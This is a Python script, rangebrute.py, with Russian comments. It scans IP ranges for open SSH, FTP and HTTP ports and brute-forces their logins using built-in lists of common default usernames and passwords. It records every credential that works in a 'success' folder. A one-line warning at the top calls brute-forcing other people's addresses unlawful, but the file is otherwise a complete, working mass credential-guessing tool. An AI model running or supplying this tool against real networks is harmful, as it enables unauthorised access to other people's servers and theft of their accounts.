# language: Python, file: rangebrute.py
# Зависимости: paramiko, requests
# ВНИМАНИЕ: брут по чужим IP — неправомерный доступ. Только свои сети/лаборатория.

import ftplib
import ipaddress
import os
import socket
import sys
import threading
import time
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

import paramiko
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ================= НАСТРОЙКИ =================
THREADS = 200                # потоков на скан
TIMEOUT = 3                  # таймаут сокета (сек)
BRUTE_THREADS = 20           # потоков на брут одного хоста
BRUTE_DELAY = 0.1            # задержка между попытками (сек)
NETWORK_RETRIES = 3          # попыток при сетевой ошибке
MAX_RANGE_SIZE = 65536       # максимум IP в диапазоне (защита от OOM)

SUCCESS_DIR = "success"
ERROR_DIR = "error"

PORT_PROTOCOLS = {
    22: "ssh",
    21: "ftp",
    3389: "rdp",
    445: "smb",
    8080: "http",
    80: "http",
    443: "http",
}

USERS = ["root", "admin", "user", "test", "guest", "ubuntu", "pi", "oracle", "postgres"]
PASSWORDS = [
    "root", "admin", "password", "123456", "12345678", "qwerty", "qwerty123",
    "admin123", "toor", "letmein", "welcome", "1234", "12345", "pass",
    "P@ssw0rd", "Password1", "test", "guest", "ubuntu", "pi", "raspberry",
]


# ================= УТИЛИТЫ =================
def ensure_dirs():
    os.makedirs(SUCCESS_DIR, exist_ok=True)
    os.makedirs(ERROR_DIR, exist_ok=True)


def log(msg: str):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)


def save_success(ip: str, port: int, proto: str, user: str, pwd: str):
    ensure_dirs()
    path = os.path.join(SUCCESS_DIR, f"{ip}_{port}_{proto}.txt")
    with open(path, "a", encoding="utf-8") as f:
        f.write(f"{ip}:{port} {proto} {user}:{pwd}\n")
    log(f"[SUCCESS] {ip}:{port} {proto} {user}:{pwd}")


def save_error(ip: str, port: int, proto: str, reason: str = ""):
    ensure_dirs()
    path = os.path.join(ERROR_DIR, f"{ip}_{port}_{proto}.txt")
    with open(path, "a", encoding="utf-8") as f:
        f.write(f"{ip}:{port} {proto} {reason}\n")


# ================= ПРОВЕРКА ПОРТА =================
def check_port(ip: str, port: int, timeout: int = TIMEOUT) -> bool:
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except Exception:
        return False


# ================= БРУТ SSH =================
def brute_ssh(ip: str, port: int, users: list, passwords: list) -> bool:
    for user in users:
        for pwd in passwords:
            for attempt in range(NETWORK_RETRIES):
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(ip, port=port, username=user, password=pwd,
                                   timeout=TIMEOUT, banner_timeout=TIMEOUT,
                                   auth_timeout=TIMEOUT, allow_agent=False,
                                   look_for_keys=False)
                    save_success(ip, port, "ssh", user, pwd)
                    client.close()
                    return True
                except paramiko.AuthenticationException:
                    time.sleep(BRUTE_DELAY)
                    break  # неверный пароль — следующая пара
                except Exception as e:
                    if attempt == NETWORK_RETRIES - 1:
                        log(f"[SSH] {ip}:{port} {user}:{pwd} — {type(e).__name__}")
                    time.sleep(BRUTE_DELAY)
    return False


# ================= БРУТ FTP =================
def brute_ftp(ip: str, port: int, users: list, passwords: list) -> bool:
    for user in users:
        for pwd in passwords:
            try:
                ftp = ftplib.FTP()
                ftp.connect(ip, port, timeout=TIMEOUT)
                ftp.login(user, pwd)
                save_success(ip, port, "ftp", user, pwd)
                ftp.quit()
                return True
            except ftplib.error_perm:
                time.sleep(BRUTE_DELAY)
                continue
            except Exception:
                time.sleep(BRUTE_DELAY)
    return False


# ================= БРУТ HTTP BASIC =================
def brute_http(ip: str, port: int, users: list, passwords: list) -> bool:
    scheme = "https" if port == 443 else "http"
    url = f"{scheme}://{ip}:{port}/"
    for user in users:
        for pwd in passwords:
            try:
                r = requests.get(url, auth=(user, pwd), timeout=TIMEOUT,
                                 verify=False, allow_redirects=False)
                if r.status_code not in (401, 403):
                    save_success(ip, port, "http", user, pwd)
                    return True
            except Exception:
                time.sleep(BRUTE_DELAY)
    return False


# ================= БРУТ ХОСТА =================
def brute_host(ip: str, port: int, proto: str, users: list, passwords: list) -> bool:
    log(f"[BRUTE] {ip}:{port} ({proto}) — старт")
    if proto == "ssh":
        ok = brute_ssh(ip, port, users, passwords)
    elif proto == "ftp":
        ok = brute_ftp(ip, port, users, passwords)
    elif proto == "http":
        ok = brute_http(ip, port, users, passwords)
    elif proto in ("rdp", "smb"):
        save_error(ip, port, proto, "protocol not implemented")
        return False
    else:
        save_error(ip, port, proto, "unknown protocol")
        return False

    if not ok:
        save_error(ip, port, proto, "brute failed")
        log(f"[FAIL] {ip}:{port} ({proto}) — не подобран")
    return ok


# ================= СКАН ХОСТА =================
def scan_host(ip: str, users: list, passwords: list) -> dict:
    result = {"ip": ip, "open": [], "found": []}
    for port, proto in PORT_PROTOCOLS.items():
        if check_port(ip, port):
            result["open"].append((port, proto))
            log(f"[OPEN] {ip}:{port} ({proto})")
    for port, proto in result["open"]:
        if brute_host(ip, port, proto, users, passwords):
            result["found"].append((port, proto))
    return result


# ================= ГЛАВНОЕ =================
def parse_range(range_str: str) -> list:
    if "/" in range_str:
        net = ipaddress.ip_network(range_str, strict=False)
        hosts = list(net.hosts())
        if len(hosts) > MAX_RANGE_SIZE:
            raise ValueError(f"диапазон слишком большой: {len(hosts)} > {MAX_RANGE_SIZE}")
        return [str(ip) for ip in hosts]
    if "-" in range_str:
        start_s, end_s = range_str.split("-", 1)
        start = int(ipaddress.ip_address(start_s.strip()))
        end = int(ipaddress.ip_address(end_s.strip()))
        if end < start:
            raise ValueError("конец диапазона меньше начала")
        size = end - start + 1
        if size > MAX_RANGE_SIZE:
            raise ValueError(f"диапазон слишком большой: {size} > {MAX_RANGE_SIZE}")
        return [str(ipaddress.ip_address(i)) for i in range(start, end + 1)]
    return [range_str.strip()]


def main():
    ensure_dirs()

    if len(sys.argv) < 2:
        print("Использование:")
        print("  python rangebrute.py 192.168.1.0/24")
        print("  python rangebrute.py 192.168.1.1-192.168.1.254")
        print("  python rangebrute.py 192.168.1.1")
        sys.exit(1)

    range_str = sys.argv[1]
    users = USERS
    passwords = PASSWORDS

    if os.path.exists("users.txt"):
        with open("users.txt", "r", encoding="utf-8") as f:
            users = [l.strip() for l in f if l.strip()]
    if os.path.exists("passwords.txt"):
        with open("passwords.txt", "r", encoding="utf-8") as f:
            passwords = [l.strip() for l in f if l.strip()]

    try:
        ips = parse_range(range_str)
    except Exception as e:
        print(f"Ошибка парсинга диапазона: {e}")
        sys.exit(1)

    log(f"Диапазон: {range_str} → {len(ips)} адресов")
    log(f"Юзеров: {len(users)}, паролей: {len(passwords)}")
    log(f"Потоков: {THREADS} (скан), {BRUTE_THREADS} (брут)")
    log("=" * 60)

    total_open = 0
    total_found = 0

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(scan_host, ip, users, passwords): ip for ip in ips}
        for future in as_completed(futures):
            ip = futures[future]
            try:
                r = future.result()
                total_open += len(r["open"])
                total_found += len(r["found"])
            except Exception as e:
                save_error(ip, 0, "scan", str(e))

    log("=" * 60)
    log(f"Готово. Открытых портов: {total_open}, успешных брутов: {total_found}")
    log(f"Результаты: {SUCCESS_DIR}/ (успех), {ERROR_DIR}/ (ошибки)")


if __name__ == "__main__":
    main()
